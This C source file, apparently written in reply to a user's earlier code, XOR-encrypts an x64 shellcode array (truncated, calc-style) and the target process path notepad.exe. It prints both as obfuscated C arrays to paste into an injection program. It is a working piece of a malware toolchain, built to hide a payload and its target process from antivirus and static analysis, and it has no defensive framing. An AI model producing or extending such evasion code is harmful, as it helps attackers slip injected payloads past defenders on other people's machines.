#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

// XOR encryption key (matches the key from your previous code)
#define XOR_KEY 0x5A

// Function to XOR-encrypt a byte array
void XorEncryptBytes(const unsigned char* input, size_t len, unsigned char key, unsigned char* output) {
    for (size_t i = 0; i < len; i++) {
        output[i] = input[i] ^ key;
    }
}

// Function to XOR-encrypt a wide string
void XorEncryptWString(const wchar_t* input, size_t len, unsigned char key, wchar_t* output) {
    for (size_t i = 0; i < len; i++) {
        output[i] = input[i] ^ key;
    }
}

// Function to print a byte array in C-style format
void PrintByteArray(const unsigned char* data, size_t len, const char* arrayName) {
    printf("const unsigned char %s[] = {\n    ", arrayName);
    for (size_t i = 0; i < len; i++) {
        printf("0x%02X", data[i]);
        if (i < len - 1) {
            printf(", ");
        }
        if ((i + 1) % 12 == 0) {
            printf("\n    ");
        }
    }
    printf("\n};\n");
}

// Function to print a wide string array in C-style format
void PrintWCharArray(const wchar_t* data, size_t len, const char* arrayName) {
    printf("const WCHAR %s[] = {\n    ", arrayName);
    for (size_t i = 0; i < len; i++) {
        printf("0x%04X", data[i]);
        if (i < len - 1) {
            printf(", ");
        }
        if ((i + 1) % 10 == 0) {
            printf("\n    ");
        }
    }
    printf("\n};\n");
}

int main(int argc, char* argv[]) {
    // Example shellcode (your RawX64CalcShellcode, truncated for brevity)
    const unsigned char shellcode[] = {
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
        // ... (your full shellcode here)
    };
    size_t shellcodeLen = sizeof(shellcode);

    // Example target process path
    const wchar_t targetPath[] = L"C:\\Windows\\System32\\notepad.exe";
    size_t targetPathLen = wcslen(targetPath) + 1; // Include null terminator

    // Buffers for encrypted output
    unsigned char* encryptedShellcode = (unsigned char*)malloc(shellcodeLen);
    wchar_t* encryptedTargetPath = (wchar_t*)malloc(targetPathLen * sizeof(wchar_t));

    if (!encryptedShellcode || !encryptedTargetPath) {
        printf("[!] Memory allocation failed\n");
        return -1;
    }

    // Encrypt shellcode
    XorEncryptBytes(shellcode, shellcodeLen, XOR_KEY, encryptedShellcode);
    printf("[+] Encrypted shellcode:\n");
    PrintByteArray(encryptedShellcode, shellcodeLen, "EncryptedShellcode");

    // Encrypt target path
    XorEncryptWString(targetPath, targetPathLen, XOR_KEY, encryptedTargetPath);
    printf("\n[+] Encrypted target path:\n");
    PrintWCharArray(encryptedTargetPath, targetPathLen, "EncryptedTargetPath");

    // Clean up
    free(encryptedShellcode);
    free(encryptedTargetPath);

    return 0;
}
